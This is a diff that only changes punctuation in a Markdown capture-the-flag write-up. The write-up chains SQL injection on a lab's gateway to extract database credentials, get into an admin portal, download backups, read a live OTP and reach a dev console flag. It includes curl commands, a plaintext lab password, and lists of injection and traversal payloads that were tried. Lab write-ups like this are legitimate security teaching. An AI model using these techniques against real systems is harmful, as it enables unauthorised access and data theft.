@@ -30,14 +30,14 @@ SQLi (Rail /api/rail/create) → DB creds → /db portal login → portalDb back
 
 1. [Reconnaissance](#1-reconnaissance)
 2. [Gateway Architecture](#2-gateway-architecture)
-3. [SQL Injection — Rail Backend](#3-sql-injection--rail-backend)
+3. [SQL Injection - Rail Backend](#3-sql-injection--rail-backend)
 4. [Database Credential Extraction](#4-database-credential-extraction)
 5. [Database Admin Portal](#5-database-admin-portal)
 6. [Backup Feature & DB Name Fuzzing](#6-backup-feature--db-name-fuzzing)
 7. [OTP Extraction & Dev Console Access](#7-otp-extraction--dev-console-access)
 8. [Flag](#8-flag)
 9. [Bonus: What Else Was in the Database](#9-bonus-what-else-was-in-the-database)
-10. [Dead Ends — What Didn't Work](#10-dead-ends--what-didnt-work)
+10. [Dead Ends - What Didn't Work](#10-dead-ends--what-didnt-work)
 11. [Race Condition (Bonus Finding)](#11-race-condition-bonus-finding)
 12. [Key Takeaways](#12-key-takeaways)
 
@@ -63,9 +63,9 @@ Response: `302 Found` with a `connect.sid` session cookie.
 ### Dashboard Exploration
 
 After login, the dashboard reveals a Half-Life themed intranet with three applications:
-- **Nexus** — a notes/document system
-- **Secure Mail** — internal messaging
-- **Dev Console** — OTP-protected at `/dev`
+- **Nexus** - a notes/document system
+- **Secure Mail** - internal messaging
+- **Dev Console** - OTP-protected at `/dev`
 
 ```bash
 # Get session cookie
@@ -75,7 +75,7 @@ COOKIE="connect.sid=s%3A<YOUR_SESSION_ID>"
 curl -s -b "$COOKIE" https://<LAB>/
 ```
 
-### Dev Console — OTP Wall
+### Dev Console - OTP Wall
 
 ```bash
 curl -s -b "$COOKIE" https://<LAB>/dev
@@ -135,7 +135,7 @@ This is critical for understanding the architecture (took me a lot of reading):
 # Zero UUID + any endpoint → "Rail endpoint not found"
 ```
 
-- The zero-UUID routes to a **hidden third backend** called "Rail" with its own error message format — confirming it's a separate service.
+- The zero-UUID routes to a **hidden third backend** called "Rail" with its own error message format - confirming it's a separate service.
 
 ### Enumerating Users
 
@@ -156,12 +156,12 @@ curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
 
 ---
 
-## 3. SQL Injection — Rail Backend
+## 3. SQL Injection - Rail Backend
 
 - After extensive endpoint fuzzing on the Rail backend, the `/api/rail/create` endpoint was discovered. The endpoint requires four fields: `type`, `message`, `timestamp`, and `priority`:
 
 ```bash
-# Rail create endpoint — requires all 4 fields
+# Rail create endpoint - requires all 4 fields
 curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
   -H "Content-Type: application/json" \
   -d '{
@@ -181,7 +181,7 @@ curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
 - The `message` field is vulnerable to INSERT-based SQL injection:
 
 ```bash
-# SQLi test — single quote in message breaks the query
+# SQLi test - single quote in message breaks the query
 curl -s -b "$COOKIE" -X POST https://<LAB>/gateway \
   -H "Content-Type: application/json" \
   -d '{
@@ -264,7 +264,7 @@ curl -s -o /dev/null -w "%{http_code}" -b "$COOKIE" https://<LAB>/db
 
 The `/db` endpoint reveals a **Database Administration** login page with `POST /db/login`.
 
-### Login — Form-Urlencoded
+### Login - Form-Urlencoded
 
 ```bash
 # Login to DB admin portal (form-urlencoded, URL-encode the ! as %21)
@@ -280,8 +280,8 @@ curl -s -i -b "$COOKIE" -X POST https://<LAB>/db/login \
 
 After authentication, the console shows:
 - **2 connected databases** (SQLite 3 engine)
-- **Backup & Export** feature — `POST /db/backup` with `{"database": "<name>"}`
-- Query Editor, Schema Viewer, etc. — all "COMING SOON"
+- **Backup & Export** feature - `POST /db/backup` with `{"database": "<name>"}`
+- Query Editor, Schema Viewer, etc. - all "COMING SOON"
 - Placeholder hint in the input field: `*Db`
 
 ---
@@ -345,7 +345,7 @@ curl -s -b "$COOKIE" \
 ### Inspecting the Databases
 
 ```bash
-# railDb — transit announcements and config (the creds we already had)
+# railDb - transit announcements and config (the creds we already had)
 sqlite3 railDb_backup.sqlite ".tables"
 # announcements  config
 
@@ -353,7 +353,7 @@ sqlite3 railDb_backup.sqlite "SELECT * FROM config;"
 # db_username|dbadmin|Database administration username|...
 # db_password|Xen_Lambda_R4ilSyst3m_2024!Cr0ss1ng|Database administration password|...
 
-# portalDb — users and config (THE JACKPOT)
+# portalDb - users and config (THE JACKPOT)
 sqlite3 portalDb_backup.sqlite ".tables"
 # config  users
 
@@ -361,7 +361,7 @@ sqlite3 portalDb_backup.sqlite "SELECT * FROM config;"
 # dev_otp|835146|1770635908
 ```
 
-- The `config` table contains **`dev_otp`** — the live OTP for the dev console.
+- The `config` table contains **`dev_otp`** - the live OTP for the dev console.
 
 ---
 
@@ -387,7 +387,7 @@ curl -s -D - -b "$COOKIE" \
   "https://<LAB>/dev/verify"
 ```
 
-**Response:** `302 Found → Location: /dev` — we're in!
+**Response:** `302 Found → Location: /dev` - we're in!
 
 > **Note:** The OTP endpoint is an HTML form POST, so it uses standard form-urlencoded data.
 
@@ -420,7 +420,7 @@ curl -s -b "$COOKIE" https://<LAB>/dev | grep -o 'bug{[^}]*}'
 | gcross | 2 | No |
 | otis | 1 | No (no Nexus access) |
 
-### Dev Console — User Provisioning
+### Dev Console - User Provisioning
 
 - The dev console also reveals a **user provisioning endpoint** that could have been an alternative path:
 
@@ -461,7 +461,7 @@ curl -s -b "$COOKIE" -X POST https://<LAB>/api/dev/users \
 
 ---
 
-## 10. Dead Ends — What Didn't Work
+## 10. Dead Ends - What Didn't Work
 
 - This lab was brutal. 
 - Here's everything that was tried and failed, to save you time:
@@ -477,26 +477,26 @@ curl -s -b "$COOKIE" -X POST https://<LAB>/api/dev/users \
 **Conclusion:** OTP uses direct string comparison, not a database query.
 
 ### Classification / Privilege Escalation
-- Mass assignment (`clearance:5`, `userId:5`) at gateway level — ignored
-- Prototype pollution (`__proto__:{clearance:5}`) — ignored
-- `classification:"public"` in note GET data — ignored
-- Creating confidential notes/mail — "Insufficient permissions" (403)
+- Mass assignment (`clearance:5`, `userId:5`) at gateway level - ignored
+- Prototype pollution (`__proto__:{clearance:5}`) - ignored
+- `classification:"public"` in note GET data - ignored
+- Creating confidential notes/mail - "Insufficient permissions" (403)
 
 ### Gateway Manipulation
-- Path traversal (`/api/../dev/time-remaining`) — "Endpoint not found"
-- Non-API endpoints — "Only /api/ endpoints are allowed"
-- Cross-app endpoint routing — "Endpoint not found"
-- Extra JSON fields (method, userId, user) — all ignored
+- Path traversal (`/api/../dev/time-remaining`) - "Endpoint not found"
+- Non-API endpoints - "Only /api/ endpoints are allowed"
+- Cross-app endpoint routing - "Endpoint not found"
+- Extra JSON fields (method, userId, user) - all ignored
 
 ### SQL Injection Limitations
-- Stacked queries — not supported
-- `ATTACH DATABASE` — blocked
-- `readfile()` / `writefile()` — not available
-- SQLi on OTP field — not injectable
+- Stacked queries - not supported
+- `ATTACH DATABASE` - blocked
+- `readfile()` / `writefile()` - not available
+- SQLi on OTP field - not injectable
 
 ### Other
-- Login as other users with common passwords — all failed
-- NoSQL injection on main login (form-urlencoded `password[$ne]=`) — **crashes the backend** (502). Don't do this.
+- Login as other users with common passwords - all failed
+- NoSQL injection on main login (form-urlencoded `password[$ne]=`) - **crashes the backend** (502). Don't do this.
 
 ---
 
@@ -529,9 +529,9 @@ seq 1 1000 | xargs -P 50 -I {} curl -s -o /dev/null -w "%{http_code}\n" \
 
 4. **Credential reuse across interfaces:** DB creds extracted from one layer (SQLi) authenticated to a completely different interface (web portal).
 
-5. **Backup features are goldmines:** The backup endpoint returned raw SQLite files. Always look for backup/export functionality — it often bypasses access controls by dumping the entire database.
+5. **Backup features are goldmines:** The backup endpoint returned raw SQLite files. Always look for backup/export functionality - it often bypasses access controls by dumping the entire database.
 
-6. **Name fuzzing matters:** The DB names weren't guessable from the app structure alone. `nexusDb` and `mailDb` both failed — only `railDb` and `portalDb` worked.
+6. **Name fuzzing matters:** The DB names weren't guessable from the app structure alone. `nexusDb` and `mailDb` both failed - only `railDb` and `portalDb` worked.
 
 7. **Time-sensitive exploitation:** The OTP rotates every 60 seconds. Chaining backup download → SQLite parse → OTP submit had to happen within one rotation window.
 
